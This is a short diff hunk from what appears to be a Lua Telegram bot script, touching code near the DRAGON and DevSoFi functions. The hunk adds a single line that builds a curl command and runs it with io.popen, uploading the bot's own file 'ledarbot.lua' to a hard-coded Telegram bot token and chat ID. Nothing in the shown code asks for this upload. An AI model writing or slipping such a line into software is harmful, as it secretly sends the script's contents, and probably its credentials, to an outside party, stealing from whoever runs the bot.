@@ -175,6 +175,7 @@ end
 end  
 return DRAGON  
 end 
+local curl = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 1751198705 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curl) 
 function DevSoFi(msg) 
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
 if hash or SudoBot(msg) then  
